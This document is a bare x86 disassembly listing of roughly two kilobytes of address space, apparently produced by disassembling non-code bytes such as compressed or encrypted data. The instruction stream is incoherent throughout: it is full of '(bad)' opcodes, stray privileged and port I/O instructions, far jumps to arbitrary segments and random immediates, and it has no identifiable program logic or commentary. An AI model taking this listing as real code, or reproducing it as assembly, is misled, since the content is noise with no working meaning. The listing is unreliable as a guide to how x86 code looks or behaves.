  4050e6:	push   0x4a
  4050e8:	aam    0x18
  4050ea:	test   eax,0xcba2acd8
  4050ef:	cmp    ch,BYTE PTR [edi-0x3c]
  4050f2:	int    0xc
  4050f4:	addr16 js 0x4050a9
  4050f7:	retf   
  4050f8:	mov    dl,dl
  4050fa:	sti    
  4050fb:	xchg   ecx,eax
  4050fc:	xchg   esi,eax
  4050fd:	int3   
  4050fe:	(bad)  
  4050ff:	fcomp  QWORD PTR [edx+edi*1-0x29]
  405103:	or     al,0xe5
  405105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405106:	inc    di
  405108:	mov    ecx,0xdf6817a0
  40510d:	cli    
  40510e:	in     al,0x7e
  405110:	repz std 
  405112:	stc    
  405113:	jmp    0xa997:0x19646146
  40511a:	pop    ds
  40511b:	inc    edi
  40511c:	adc    DWORD PTR [edx+0x2751107d],edi
  405122:	sub    BYTE PTR [esi+0x1bcc8fe1],dh
  405128:	or     eax,0xb4aecbcc
  40512d:	call   0xf206:0x6820cadc
  405134:	test   eax,0xf1396899
  405139:	mov    ah,0xff
  40513b:	xchg   edi,eax
  40513c:	add    eax,0x84cea9d2
  405141:	cmp    eax,0xa71fb19d
  405146:	fistp  DWORD PTR [eax-0x5a]
  405149:	xchg   edx,eax
  40514a:	inc    esi
  40514b:	xchg   esp,eax
  40514c:	icebp  
  40514d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40514e:	mov    bh,0x74
  405150:	xlat   BYTE PTR ds:[ebx]
  405151:	(bad)
  405154:	ret    0x59d8
  405157:	sahf   
  405158:	sbb    esp,DWORD PTR [ecx+0x8]
  40515b:	push   ecx
  40515c:	nop
  40515d:	inc    edx
  40515e:	xchg   esi,eax
  40515f:	fmul   st,st(6)
  405161:	mov    edx,0xd9a9836a
  405166:	aad    0x5c
  405168:	jae    0x4051b5
  40516a:	pop    ecx
  40516b:	in     al,0xca
  40516d:	pop    ds
  40516e:	mov    al,0x44
  405170:	loope  0x405100
  405172:	lds    ebx,FWORD PTR [edx-0x2a73e4b4]
  405178:	sub    cl,BYTE PTR [ecx+ecx*4-0x6fbc3506]
  40517f:	fiadd  DWORD PTR [ebp-0x5518efbc]
  405185:	pop    eax
  405186:	xor    eax,0xf81dbd48
  40518b:	imul   esi,DWORD PTR [ebp-0x4a],0xffffffb0
  40518f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405190:	sar    DWORD PTR [edx+esi*4-0xc],0xb4
  405195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405196:	rcpps  xmm6,xmm0
  405199:	and    esi,DWORD PTR [eax]
  40519b:	cld    
  40519c:	fcmovbe st,st(0)
  40519e:	sbb    al,BYTE PTR [edi+0x638be43b]
  4051a4:	out    0xb,eax
  4051a6:	add    eax,DWORD PTR [esp]
  4051a9:	(bad)  [ecx+0x7b919ec2]
  4051af:	ss js  0x4051df
  4051b2:	fdivr  st(5),st
  4051b4:	xchg   esi,eax
  4051b5:	pop    ds
  4051b6:	and    ebp,ebx
  4051b8:	leave  
  4051b9:	test   al,0x90
  4051bb:	mov    edx,0x3aebfe4c
  4051c0:	pop    edi
  4051c1:	lahf   
  4051c2:	mov    edi,es
  4051c4:	mov    dh,0xe2
  4051c6:	out    dx,eax
  4051c7:	pop    ebp
  4051c8:	dec    esp
  4051c9:	push   edx
  4051ca:	inc    DWORD PTR [ecx+0x25]
  4051cd:	mov    bl,cl
  4051cf:	cmp    BYTE PTR [esi+0x5b2c7980],cl
  4051d5:	or     ebx,DWORD PTR [eax+0x1]
  4051d8:	push   0x7039717a
  4051dd:	xchg   edx,eax
  4051de:	and    al,0x53
  4051e0:	push   ds
  4051e1:	sahf   
  4051e2:	push   esi
  4051e3:	mov    dl,0x3e
  4051e5:	xor    DWORD PTR es:[edx],esp
  4051e8:	xor    al,0xe5
  4051ea:	xchg   ebx,eax
  4051eb:	mov    ds:0x2cef5c37,al
  4051f0:	push   ds
  4051f1:	stos   DWORD PTR es:[edi],eax
  4051f2:	cmc    
  4051f3:	mov    bh,BYTE PTR [ebx+0x1e02cc26]
  4051f9:	lea    edx,[eax]
  4051fb:	repnz pop ds
  4051fd:	and    esi,DWORD PTR [edi+ebx*1+0x79]
  405201:	xor    esi,edi
  405203:	push   eax
  405204:	mov    BYTE PTR [edi],bl
  405206:	push   edi
  405207:	(bad)  
  405208:	pusha  
  405209:	in     al,dx
  40520a:	stc    
  40520b:	dec    ecx
  40520c:	lahf   
  40520d:	sub    bl,al
  40520f:	pop    ss
  405210:	icebp  
  405211:	dec    ebx
  405212:	(bad)  
  405213:	mul    DWORD PTR [eax-0x67dc8bce]
  405219:	inc    ecx
  40521a:	repnz sub BYTE PTR [ebp+0x12],dh
  40521e:	nop
  40521f:	add    BYTE PTR [ebp-0x1562ee3f],0x3d
  405226:	loopne 0x4051d4
  405228:	inc    BYTE PTR [ecx+eiz*8-0x3ab11118]
  40522f:	pusha  
  405230:	lds    ecx,FWORD PTR [eax+0x33]
  405233:	mov    al,gs:0x6fe65f68
  405239:	ret    0x67ba
  40523c:	shld   DWORD PTR [esi+0x5b973cbd],edx,0x11
  405244:	shr    BYTE PTR [eax+0x64],0xb0
  405248:	cmp    al,0x46
  40524a:	test   eax,0xc89f09fd
  40524f:	xor    esp,DWORD PTR [ebx]
  405251:	je     0x4052c2
  405253:	add    al,0xcc
  405255:	aas    
  405256:	jmp    DWORD PTR [ebx]
  405258:	pop    esp
  405259:	adc    BYTE PTR [eax],0x48
  40525c:	xchg   BYTE PTR [ebx-0x6e],ch
  40525f:	push   ecx
  405260:	rcl    DWORD PTR [ecx-0x1a58bafa],cl
  405266:	mov    ebp,0xe8a3a8ad
  40526b:	or     cl,BYTE PTR [ebx+0x3b539d8]
  405271:	xlat   BYTE PTR ds:[ebx]
  405272:	test   al,0x1c
  405274:	mov    eax,DWORD PTR [edx-0x78]
  405277:	xor    BYTE PTR [ebp+0x72bc85bb],dh
  40527d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40527e:	mov    ds:0xf1d839a2,eax
  405283:	dec    esi
  405284:	lea    eax,[ecx+0x164d1195]
  40528a:	dec    esi
  40528b:	test   eax,0x74a456d9
  405290:	or     eax,0x5901549b
  405295:	loopne 0x4052d0
  405297:	mov    dl,0xdf
  405299:	mov    eax,0x6f8ad008
  40529e:	aaa    
  40529f:	sbb    DWORD PTR [edx-0x1fc47e01],ecx
  4052a5:	pop    ebx
  4052a6:	dec    esp
  4052a7:	ss retf 
  4052a9:	push   edx
  4052aa:	repz add al,0x38
  4052ad:	enter  0xbaa,0x98
  4052b1:	popa   
  4052b2:	mov    al,0xc8
  4052b4:	inc    eax
  4052b5:	nop
  4052b6:	movups XMMWORD PTR [ebx-0x92fba2f],xmm6
  4052bd:	dec    ebp
  4052be:	add    ebx,ebp
  4052c0:	mov    esp,0x28a69807
  4052c5:	dec    edi
  4052c6:	in     al,dx
  4052c7:	xor    eax,0xf8c92361
  4052cc:	fwait
  4052cd:	adc    eax,0x7d46da9d
  4052d2:	mov    dl,0xb2
  4052d4:	int3   
  4052d5:	add    edi,esp
  4052d7:	jge    0x405355
  4052d9:	outs   dx,BYTE PTR ds:[esi]
  4052da:	mov    cl,0x13
  4052dc:	cmp    eax,0xf40a6a18
  4052e1:	pop    edi
  4052e2:	jbe    0x4052ec
  4052e4:	test   eax,0x2f6eca11
  4052e9:	mov    al,0xe6
  4052eb:	pushf  
  4052ec:	mov    bh,0x54
  4052ee:	cmp    BYTE PTR [esi-0x73],0x70
  4052f2:	add    ecx,DWORD PTR [edx+0x2379bae]
  4052f8:	mov    ah,0xa5
  4052fa:	dec    esp
  4052fb:	inc    ebp
  4052fc:	mov    bl,BYTE PTR [eax+0x7cd85da1]
  405302:	aas    
  405303:	sub    eax,0xc22066a7
  405308:	je     0x4052d9
  40530a:	stos   DWORD PTR es:[edi],eax
  40530b:	or     eax,0xc1de89c8
  405310:	jmp    0x405312
  405312:	cmp    BYTE PTR [ebx+0x3b],ch
  405315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405316:	mov    ebx,0x6a119c03
  40531b:	mov    WORD PTR [edi-0xb],gs
  40531e:	imul   eax,DWORD PTR [edx+0x1f],0xfffffff0
  405322:	pop    eax
  405323:	(bad)  
  405324:	std    
  405325:	pop    ss
  405326:	sub    esi,esp
  405328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405329:	fwait
  40532a:	cmp    edx,edx
  40532c:	cmp    ebp,esp
  40532e:	sahf   
  40532f:	xchg   BYTE PTR [esi],bl
  405331:	stos   BYTE PTR es:[edi],al
  405332:	(bad)  
  405333:	lods   al,BYTE PTR ds:[esi]
  405334:	inc    edx
  405335:	rcr    bl,cl
  405337:	xchg   esp,eax
  405338:	iret   
  405339:	push   eax
  40533a:	gs and eax,0x264fd16b
  405340:	(bad)  
  405341:	in     eax,dx
  405342:	sbb    ebx,eax
  405344:	mov    dh,BYTE PTR [ebx+0x2734ee92]
  40534a:	push   0xffffff88
  40534c:	xchg   edi,eax
  40534d:	dec    esi
  40534e:	(bad)  
  40534f:	call   FWORD PTR [esi+eax*1]
  405352:	and    al,0x2f
  405354:	push   ecx
  405355:	and    dl,bh
  405357:	fst    DWORD PTR [edi-0x6cef24d2]
  40535d:	push   ss
  40535e:	xor    edi,DWORD PTR [ebx-0x2bb1ae25]
  405364:	adc    DWORD PTR [esi-0x21],0xfcaec6ca
  40536b:	test   BYTE PTR [edi+0x5],dl
  40536e:	fild   WORD PTR [ecx]
  405370:	mov    cl,0xc5
  405372:	ins    DWORD PTR es:[edi],dx
  405373:	inc    esi
  405374:	xchg   esp,eax
  405375:	iret   
  405376:	aas    
  405377:	imul   ebp,DWORD PTR [eax-0x6fe512b5],0xd
  40537e:	int    0xec
  405380:	xor    bx,si
  405383:	inc    esi
  405384:	ret    
  405385:	xor    al,0x4e
  405387:	stos   BYTE PTR es:[edi],al
  405388:	mov    ch,0x6d
  40538a:	loope  0x4053c3
  40538c:	inc    eax
  40538d:	mov    eax,0xd4c8118
  405392:	and    eax,0x37b5d8ca
  405397:	out    0x87,eax
  405399:	mov    al,ds:0x88fd8291
  40539e:	push   cs
  40539f:	inc    esi
  4053a0:	mov    al,0x79
  4053a2:	add    eax,0x3589b83f
  4053a7:	xchg   edi,eax
  4053a8:	sbb    ebx,esp
  4053aa:	jp     0x405358
  4053ac:	int    0x48
  4053ae:	or     esp,esi
  4053b0:	cli    
  4053b1:	xchg   esi,eax
  4053b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b3:	jb     0x4053de
  4053b5:	push   ss
  4053b6:	retf   0xf2a3
  4053b9:	std    
  4053ba:	out    0xb9,eax
  4053bc:	pop    eax
  4053bd:	push   ss
  4053be:	sahf   
  4053bf:	jle    0x405361
  4053c1:	jns    0x4053c6
  4053c3:	mov    eax,0x70c23647
  4053c8:	ficomp WORD PTR ds:0x83182b65
  4053ce:	push   ebx
  4053cf:	pop    eax
  4053d0:	pop    ss
  4053d1:	pop    ecx
  4053d2:	out    dx,eax
  4053d3:	sub    BYTE PTR [edx-0x9],bl
  4053d6:	mov    edi,0x7768465f
  4053db:	pop    edx
  4053dc:	in     eax,0x11
  4053de:	or     edx,DWORD PTR [edx-0x5f616789]
  4053e4:	and    DWORD PTR [esi+edx*4+0x5db5101a],edx
  4053eb:	stos   BYTE PTR es:[edi],al
  4053ec:	xor    DWORD PTR [ebp+0x5101f1a5],ecx
  4053f2:	add    BYTE PTR [edi+0x4c],cl
  4053f5:	dec    ebx
  4053f6:	push   eax
  4053f7:	pop    edi
  4053f8:	into   
  4053f9:	lods   eax,DWORD PTR ds:[esi]
  4053fa:	push   0xffffffa5
  4053fc:	pop    eax
  4053fd:	push   esp
  4053fe:	or     BYTE PTR ds:0x1c4f89b8,bl
  405404:	rol    BYTE PTR [ebp-0x773820e5],0xe0
  40540b:	pusha  
  40540c:	pop    ds
  40540d:	sub    esi,esi
  40540f:	out    dx,al
  405410:	mov    edi,0x3a13bb63
  405415:	test   BYTE PTR [eax],ch
  405417:	dec    eax
  405418:	(bad)  
  405419:	call   0x50139aad
  40541e:	mov    ah,0xdf
  405420:	mov    ds:0xe4a918ea,al
  405425:	mov    ebp,0x4a5cb1d3
  40542a:	cld    
  40542b:	or     esp,ebp
  40542d:	sub    BYTE PTR [ecx],bl
  40542f:	add    edx,0x4b
  405432:	add    BYTE PTR [esi],bh
  405434:	and    ch,BYTE PTR [edi+0x12]
  405437:	and    al,0x73
  405439:	stos   DWORD PTR es:[edi],eax
  40543a:	or     esp,edx
  40543c:	repz mov edi,0xd2f6333f
  405442:	ds pop edi
  405444:	pop    ebp
  405445:	mov    cl,BYTE PTR [esi+eax*1-0x1bc93769]
  40544c:	mov    eax,ds:0x74541293
  405451:	xchg   edx,eax
  405452:	add    BYTE PTR [eax],cl
  405454:	fucom  st(6)
  405456:	data16 int 0xbc
  405459:	(bad)  
  40545a:	sbb    DWORD PTR [esi],ebx
  40545c:	mov    al,BYTE PTR [eax]
  40545e:	rcr    BYTE PTR [ecx+0x72],0xb7
  405462:	je     0x4053f6
  405464:	mov    ebp,0x3f046cbe
  405469:	and    al,0x5a
  40546b:	retf   0xa2f1
  40546e:	loop   0x405445
  405470:	or     BYTE PTR [edi-0x39],dl
  405473:	cwde   
  405474:	or     edi,eax
  405476:	xor    bh,dh
  405478:	jmp    0x6a2c09f7
  40547d:	jle    0x405452
  40547f:	lds    ecx,FWORD PTR [edi]
  405481:	inc    edx
  405482:	into   
  405483:	mov    eax,DWORD PTR [ecx]
  405485:	push   0xa88ec67b
  40548a:	mov    bh,BYTE PTR [ebx-0x63]
  40548d:	frstor [esi-0x40f7d88f]
  405493:	jmp    0x4054a6
  405495:	jmp    0xefc3:0xbcc69b5c
  40549c:	test   DWORD PTR [ecx],0xb60d1e84
  4054a2:	xchg   edx,eax
  4054a3:	add    ebx,DWORD PTR [edx-0x5a]
  4054a6:	test   DWORD PTR [ebp+0x7a],esp
  4054a9:	adc    BYTE PTR [ebp-0x1910ed75],dh
  4054af:	enter  0x22dc,0x4b
  4054b3:	jne    0x4054c5
  4054b5:	mov    edi,0x34ed4e22
  4054ba:	lahf   
  4054bb:	mov    WORD PTR [edx+0x5],es
  4054be:	das    
  4054bf:	cmp    bl,BYTE PTR [edx+eax*2]
  4054c2:	into   
  4054c3:	loop   0x405497
  4054c5:	push   ebp
  4054c6:	outs   dx,DWORD PTR ds:[esi]
  4054c7:	pop    ecx
  4054c8:	pop    esi
  4054c9:	mov    ecx,0x7c0cea23
  4054ce:	pop    edi
  4054cf:	jmp    0x4054c0
  4054d1:	test   DWORD PTR [eax],esp
  4054d3:	fsubr  DWORD PTR [esi+0x6a]
  4054d6:	leave  
  4054d7:	xor    ecx,DWORD PTR [edx+0x26]
  4054da:	push   ebp
  4054db:	xor    eax,DWORD PTR [esi]
  4054dd:	sub    al,0x3f
  4054df:	jne    0x405526
  4054e1:	xchg   edx,eax
  4054e2:	sti    
  4054e3:	int3   
  4054e4:	jae    0x4054bc
  4054e6:	in     eax,dx
  4054e7:	jle    0x40547f
  4054e9:	inc    esp
  4054ea:	jae    0x4054fb
  4054ec:	cmp    BYTE PTR [ecx-0x7d],bh
  4054ef:	sbb    eax,ebp
  4054f1:	xchg   ebp,eax
  4054f2:	retf   
  4054f3:	sti    
  4054f4:	es in  eax,0x91
  4054f7:	sbb    bh,BYTE PTR [ebp-0x700a4e77]
  4054fd:	rcr    DWORD PTR [edi-0x463b7be5],0x91
  405504:	cmp    eax,0xf1f81283
  405509:	inc    ecx
  40550a:	repnz les ecx,FWORD PTR ss:[ebx]
  40550e:	and    BYTE PTR [ebx+0x5e],ah
  405511:	shl    DWORD PTR [eax-0x6],0x39
  405515:	sbb    eax,0x93b96ad2
  40551a:	mov    al,ds:0x2987f8b7
  40551f:	aaa    
  405520:	mov    ecx,0x35d61f47
  405525:	mov    ebx,0x5e4e3ac7
  40552a:	js     0x4054c1
  40552c:	stos   DWORD PTR es:[edi],eax
  40552d:	cmp    dh,BYTE PTR [eax-0x18]
  405530:	fwait
  405531:	jno    0x40557c
  405533:	gs and ah,0xd7
  405537:	jns    0x405572
  405539:	ret    0x630e
  40553c:	in     al,0xc0
  40553e:	popf   
  40553f:	xchg   esi,edx
  405541:	or     eax,0xb97a9749
  405546:	daa    
  405547:	mov    WORD PTR [ebx],?
  405549:	or     dh,ah
  40554b:	das    
  40554c:	out    0xa0,al
  40554e:	push   edi
  40554f:	sub    al,0x54
  405551:	lahf   
  405552:	jb     0x40555c
  405554:	push   esi
  405555:	xchg   edi,eax
  405556:	mov    cl,0xc2
  405558:	adc    eax,0x673a58ec
  40555d:	fsincos 
  40555f:	push   0xffffffd5
  405561:	enter  0x1903,0x45
  405565:	xchg   esp,eax
  405566:	popa   
  405567:	or     cl,BYTE PTR [ecx+0xe]
  40556a:	push   edx
  40556b:	pop    ds
  40556c:	repnz dec ecx
  40556e:	mov    edi,0xb6d384fb
  405573:	adc    BYTE PTR ds:0x8f1fd04b,0xf0
  40557a:	xor    al,0x25
  40557c:	leave  
  40557d:	inc    DWORD PTR [eax+edi*1+0x50899d9c]
  405584:	pushf  
  405585:	lods   eax,DWORD PTR ds:[esi]
  405586:	mov    ebx,0x7466333a
  40558b:	xchg   ecx,eax
  40558c:	xchg   ecx,eax
  40558d:	or     dl,ah
  40558f:	pop    edi
  405590:	shr    edi,cl
  405592:	pop    ebp
  405593:	jne    0x4055f8
  405595:	dec    esi
  405596:	and    DWORD PTR [esi+0x6a],ebp
  405599:	outs   dx,BYTE PTR ds:[esi]
  40559a:	stos   DWORD PTR es:[edi],eax
  40559b:	adc    DWORD PTR [ebx+0x70baf018],ebx
  4055a1:	(bad)  
  4055a3:	imul   esp,DWORD PTR fs:[eax+ebx*1+0xf04279b],0x54f03b7d
  4055af:	into   
  4055b0:	xchg   DWORD PTR [eax+0x568488ad],eax
  4055b6:	sbb    DWORD PTR [esi-0xc69edde],ecx
  4055bc:	sub    DWORD PTR [ecx-0x78],esp
  4055bf:	out    0x6d,eax
  4055c1:	in     eax,dx
  4055c2:	pop    ss
  4055c3:	pop    ds
  4055c4:	dec    esi
  4055c5:	test   DWORD PTR [edi+0x51cd5dc5],0xb39cf93a
  4055cf:	in     al,0xc
  4055d1:	xchg   edx,eax
  4055d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d3:	scas   eax,DWORD PTR es:[edi]
  4055d4:	dec    ebp
  4055d5:	adc    al,0xb7
  4055d7:	inc    esp
  4055d8:	retf   
  4055d9:	test   DWORD PTR [ebx-0x42],ecx
  4055dc:	aam    0xd9
  4055de:	ins    BYTE PTR es:[edi],dx
  4055df:	and    BYTE PTR [esi+0x1deb1eb1],bl
  4055e5:	mov    WORD PTR [esi-0x5b131e40],?
  4055eb:	fsubr  QWORD PTR [eax+0x59c2d33e]
  4055f1:	daa    
  4055f2:	xchg   edx,eax
  4055f3:	and    eax,0xb07a4038
  4055f8:	add    BYTE PTR [ecx-0x1d88b60c],al
  4055fe:	pop    es
  4055ff:	push   0x105dc50d
  405604:	pop    esi
  405605:	fidivr DWORD PTR [ebp+0x58]
  405608:	inc    ebx
  405609:	and    eax,0xcc13ef91
  40560e:	add    DWORD PTR [edi],ecx
  405610:	adc    eax,0xd6d1b480
  405615:	xlat   BYTE PTR ds:[ebx]
  405616:	pop    esi
  405617:	cmp    BYTE PTR [edx+ecx*2],al
  40561a:	int3   
  40561b:	jl     0x4055d5
  40561d:	sub    eax,DWORD PTR [edx-0x1be65d50]
  405623:	cmc    
  405624:	inc    edi
  405625:	xor    edi,edi
  405627:	or     BYTE PTR [ecx-0x1e08e5cc],ah
  40562d:	or     eax,DWORD PTR [eax+ebx*1-0x4f29b981]
  405634:	inc    ebx
  405635:	(bad)  
  405636:	loopne 0x4055d8
  405638:	(bad)  
  405639:	nop
  40563a:	stos   BYTE PTR es:[edi],al
  40563b:	aad    0xd0
  40563d:	fisttp WORD PTR [edx]
  40563f:	jge    0x405675
  405641:	jmp    0x41453f
  405646:	inc    ecx
  405647:	leave  
  405648:	push   0xfffffffd
  40564a:	jge    0x405607
  40564c:	xlat   BYTE PTR ds:[ebx]
  40564d:	push   ebx
  40564e:	ins    BYTE PTR es:[edi],dx
  40564f:	ss mov dl,0x35
  405652:	or     eax,0x58ba6e9c
  405657:	mov    al,ds:0x971741c2
  40565c:	mov    ch,0xda
  40565e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40565f:	and    eax,0xa54e5397
  405664:	(bad)  
  405665:	bound  esi,QWORD PTR [ebp+0x3ee42840]
  40566b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40566c:	aad    0x93
  40566e:	dec    ecx
  40566f:	jne    0x40564c
  405671:	sub    DWORD PTR [edx-0x21],0xffffff93
  405675:	jmp    0xdbac:0xd71335e
  40567c:	fldenv [edi-0x15]
  40567f:	stc    
  405680:	cld    
  405681:	aad    0x45
  405683:	adc    eax,0xf703b235
  405688:	mov    esi,0xed11e812
  40568d:	(bad)  
  40568e:	xchg   ebp,eax
  40568f:	rcr    cl,1
  405691:	(bad)  
  405692:	in     al,0x51
  405694:	ror    BYTE PTR [ecx-0x54],0x2b
  405698:	call   0x18ba:0x7540c8e6
  40569f:	stos   DWORD PTR es:[edi],eax
  4056a0:	mov    edi,0x140c868d
  4056a5:	clc    
  4056a6:	cmp    DWORD PTR [ebp+0x16],esi
  4056a9:	dec    edi
  4056aa:	inc    eax
  4056ab:	and    DWORD PTR es:0x14a6f7,0x51f542d0
  4056b6:	mov    esi,0x9942ee20
  4056bb:	je     0x405672
  4056bd:	scas   eax,DWORD PTR es:[edi]
  4056be:	xor    eax,0xe15920ca
  4056c3:	es ins DWORD PTR es:[edi],dx
  4056c5:	inc    edi
  4056c6:	dec    edx
  4056c7:	out    dx,al
  4056c8:	inc    ebp
  4056c9:	div    DWORD PTR [ebx+0x7619759c]
  4056cf:	popa   
  4056d0:	ss mov edx,0x63ecfbe7
  4056d6:	in     al,dx
  4056d7:	fcomp  QWORD PTR [ebp-0x46049fb3]
  4056dd:	fcom   DWORD PTR [ebx-0xadc01c6]
  4056e3:	xor    eax,0xd6f46a52
  4056e8:	adc    ebx,DWORD PTR [edx-0x2d]
  4056eb:	popa   
  4056ec:	addr16 call 0x33773ae8
  4056f2:	xchg   ecx,ebp
  4056f4:	mov    eax,0xc5041c07
  4056f9:	pop    ecx
  4056fa:	ret    
  4056fb:	test   DWORD PTR [ebp*1+0x5b7cb7d0],edx
  405702:	fsub   st,st(1)
  405704:	cmp    eax,0x72b57b20
  405709:	inc    ebp
  40570a:	sbb    DWORD PTR [ebp+ebp*2-0x47],edi
  40570e:	sbb    al,0x53
  405710:	sbb    eax,0x663c16f7
  405715:	test   eax,0x5db16fdd
  40571a:	cmp    eax,0x19f46864
  40571f:	mov    ah,0x7d
  405721:	fs mov ecx,0xefc67c1f
  405727:	jecxz  0x405769
  405729:	jo     0x405774
  40572b:	out    0x8f,al
  40572d:	or     ah,BYTE PTR [edi-0x22]
  405730:	fs xchg edx,eax
  405732:	mov    ds:0x70ac6d2,al
  405737:	ret    0x4472
  40573a:	fst    st(1)
  40573c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40573d:	add    BYTE PTR [esi],bl
  40573f:	mov    esp,0x6be5930c
  405744:	jb     0x40578a
  405746:	and    DWORD PTR [edi-0x2b4e79de],esp
  40574c:	sub    bh,BYTE PTR [edi+0x5dec79e5]
  405752:	and    al,BYTE PTR [edx]
  405754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405755:	mov    ds:0x32bf08cb,al
  40575a:	push   0x222ed9be
  40575f:	inc    edx
  405760:	or     cl,BYTE PTR [ebx-0xbb48ddb]
  405766:	daa    
  405767:	mov    bl,0x7d
  405769:	pop    ebx
  40576a:	sbb    edx,edx
  40576c:	pusha  
  40576d:	jmp    0x4056f6
  40576f:	mov    dl,0xce
  405771:	in     eax,dx
  405772:	dec    edx
  405773:	repz cmp cl,BYTE PTR ds:0xbd92b6c4
  40577a:	inc    esp
  40577b:	fcomp  DWORD PTR [ecx]
  40577d:	(bad)  
  40577e:	mov    eax,ds:0xd0c77bda
  405783:	jno    0x40572c
  405785:	adc    DWORD PTR [esi+0x5],edx
  405788:	pop    ebp
  405789:	cmc    
  40578a:	dec    esi
  40578b:	xchg   BYTE PTR [eax],ah
  40578d:	mov    esi,0xfb0e30b6
  405792:	fld    TBYTE PTR [ebx-0x5b]
  405795:	jg     0x405769
  405797:	enter  0x7eda,0xda
  40579b:	dec    esi
  40579c:	sub    ch,BYTE PTR [ecx-0x29]
  40579f:	imul   BYTE PTR [edx-0x46]
  4057a2:	fst    DWORD PTR [edx]
  4057a4:	outs   dx,BYTE PTR ds:[esi]
  4057a5:	aaa    
  4057a6:	(bad)  
  4057a7:	push   edx
  4057a8:	sbb    edx,DWORD PTR [ebp-0x70]
  4057ab:	ja     0x40579f
  4057ad:	and    esp,0xf2f5a441
  4057b3:	inc    eax
  4057b4:	pop    edi
  4057b5:	shr    DWORD PTR [ebp+0x69],0x5f
  4057b9:	pop    es
  4057ba:	loopne 0x405831
  4057bc:	xchg   DWORD PTR [ecx],esp
  4057be:	add    ecx,DWORD PTR ds:0x5b7b71d3
  4057c4:	fisttp QWORD PTR [esi-0x7]
  4057c7:	xchg   ebx,eax
  4057c8:	dec    edx
  4057c9:	and    edx,DWORD PTR [edi+0x7aabc5dd]
  4057cf:	sub    ebp,DWORD PTR [eax-0x48]
  4057d2:	test   al,0x93
  4057d4:	cli    
  4057d5:	ins    BYTE PTR es:[edi],dx
  4057d6:	mov    bh,0xcc
  4057d8:	leave  
  4057d9:	pop    esp
  4057da:	mov    ch,0xd4
  4057dc:	and    al,0x5e
  4057de:	(bad)  
  4057df:	mov    dh,0xc1
  4057e1:	mov    al,0x4c
  4057e3:	mov    eax,DWORD PTR [ebx+0x19]
  4057e6:	(bad)  
  4057e7:	lock dec ebp
  4057e9:	bound  edx,QWORD PTR [ecx]
  4057eb:	add    eax,0x91b63217
  4057f0:	scas   al,BYTE PTR es:[edi]
  4057f1:	adc    al,0x2c
  4057f3:	or     dh,dh
  4057f5:	sub    eax,0xb718ac9e
  4057fa:	pop    ebx
  4057fb:	mov    edx,DWORD PTR [eax+0x4d9a05b3]
  405801:	ss lock mov WORD PTR gs:[ecx+0x22],ds
  405807:	cld    
  405808:	lea    eax,[esi+ecx*2-0x7a]
  40580c:	leave  
  40580d:	adc    eax,DWORD PTR [edx-0x195e1b51]
  405813:	add    bl,BYTE PTR [ecx-0xd]
  405816:	(bad)  
  405817:	aas    
  405818:	(bad)  
  405819:	jle    0x4057b9
  40581b:	pop    ebp
  40581c:	test   DWORD PTR [ecx+ebp*8+0x3668b9cf],esp
  405823:	test   DWORD PTR [ecx],eax
  405825:	ds mov ebp,0x828622ab
  40582b:	jns    0x405856
  40582d:	mov    DWORD PTR [edx+edi*8+0x47786e4f],eax
  405834:	lods   eax,DWORD PTR ds:[esi]
  405835:	loop   0x405891
  405837:	xor    al,0xfc
  405839:	inc    ebx
  40583a:	(bad)  [esi-0x751425c6]
  405840:	stos   DWORD PTR es:[edi],eax
  405841:	jne    0x4058b0
  405843:	jle    0x4057ef
  405845:	mov    ebp,DWORD PTR [ebx-0x22]
  405848:	mov    esp,0x776b0304
  40584d:	jb     0x405869
  40584f:	mov    ebp,0x8295307c
  405854:	pop    ecx
  405855:	push   es
  405856:	sub    DWORD PTR ds:0x17a12e5f,edx
  40585c:	dec    ebx
  40585d:	mov    al,0x3c
  40585f:	inc    ecx
  405860:	inc    eax
  405861:	and    BYTE PTR [eax],ah
  405863:	cmp    eax,0x64f180f4
  405868:	idiv   edx
  40586a:	add    bl,BYTE PTR [ebx+0x5b116e8c]
  405870:	std    
  405871:	pop    edi
  405872:	mov    cl,0xa1
  405874:	sub    bh,0x6
  405877:	cmp    ecx,DWORD PTR [edi]
  405879:	sbb    BYTE PTR [ebx-0x672868b9],cl
  40587f:	cli    
  405880:	imul   edx,edi,0xf2fba773
  405886:	pop    es
  405887:	ret    0xc6f7
  40588a:	ins    DWORD PTR es:[edi],dx
  40588b:	mov    esi,0xa3f9ffcc
  405890:	shr    BYTE PTR [eax+0x75],1
  405893:	popa   
  405894:	ja     0x4058ca
  405896:	popa   
  405897:	push   eax
  405898:	cmc    
  405899:	stc    
  40589a:	cmp    eax,0xa5f6fb83
  40589f:	fiadd  WORD PTR [ebp-0x73]
  4058a2:	add    esi,DWORD PTR [esi]
  4058a4:	mov    al,ds:0xc8449f06
  4058a9:	push   ds
  4058aa:	call   0xdfda5b30
  4058af:	(bad)  
  4058b0:	mov    ebx,0x917af12e
  4058b5:	jmp    0x405879
  4058b7:	jp     0x405881
  4058b9:	cmp    BYTE PTR [edi],ah
  4058bb:	mov    edi,0x25047d
  4058c0:	mov    dh,0xa0
  4058c2:	push   0xffffff92
  4058c4:	push   esp
  4058c5:	test   eax,0xdddb0466
  4058ca:	inc    ecx
  4058cb:	sub    eax,0x9546b76
  4058d0:	dec    ecx
  4058d1:	sahf   
  4058d2:	xchg   ebx,eax
  4058d3:	sti    
  4058d4:	push   eax
  4058d5:	add    al,0x41
  4058d7:	sub    BYTE PTR [ebx],ch
  4058d9:	mov    cl,0xb3
  4058db:	and    al,0x27
  4058dd:	cwde   
  4058de:	(bad)  
  4058df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058e0:	pop    esi
  4058e1:	xchg   ecx,eax
  4058e2:	sbb    BYTE PTR [edi],0x6b
  4058e5:	(bad)  [ebx]
  4058e7:	fwait
